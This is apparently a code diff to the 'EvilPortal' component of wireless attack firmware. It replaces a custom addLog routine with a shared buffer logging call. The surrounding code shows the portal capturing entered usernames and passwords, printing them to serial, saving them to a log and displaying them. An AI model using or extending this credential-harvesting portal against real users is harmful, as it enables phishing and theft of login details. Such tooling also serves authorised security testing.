@@ -272,37 +272,6 @@ void EvilPortal::startPortal() {
   this->runServer = true;
 }
 
-void EvilPortal::convertStringToUint8Array(const String& str, uint8_t*& buf, uint32_t& len) {
-  len = str.length(); // Obtain the length of the string
-
-  buf = new uint8_t[len]; // Dynamically allocate the buffer
-
-  // Copy each character from the string to the buffer
-  for (uint32_t i = 0; i < len; i++) {
-    buf[i] = static_cast<uint8_t>(str.charAt(i));
-  }
-}
-
-void EvilPortal::addLog(String log, int len) {
-  bool save_packet = settings_obj.loadSetting<bool>(text_table4[7]);
-  if (save_packet) {
-    uint8_t* logBuffer = nullptr;
-    uint32_t logLength = 0;
-    this->convertStringToUint8Array(log, logBuffer, logLength);
-    
-    #ifdef WRITE_PACKETS_SERIAL
-      buffer_obj.addPacket(logBuffer, logLength, true);
-      delete[] logBuffer;
-    #elif defined(HAS_SD)
-      sd_obj.addPacket(logBuffer, logLength, true);
-      delete[] logBuffer;
-    #else
-      delete[] logBuffer;
-      return;
-    #endif
-  }
-}
-
 void EvilPortal::sendToDisplay(String msg) {
   #ifdef HAS_SCREEN
     String display_string = "";
@@ -329,7 +298,7 @@ void EvilPortal::main(uint8_t scan_mode) {
       String logValue2 = "p: " + this->password;
       String full_string = logValue1 + " " + logValue2 + "\n";
       Serial.print(full_string);
-      this->addLog(full_string, full_string.length());
+      buffer_obj.logAdd(full_string);
       #ifdef HAS_SCREEN
         this->sendToDisplay(full_string);
       #endif
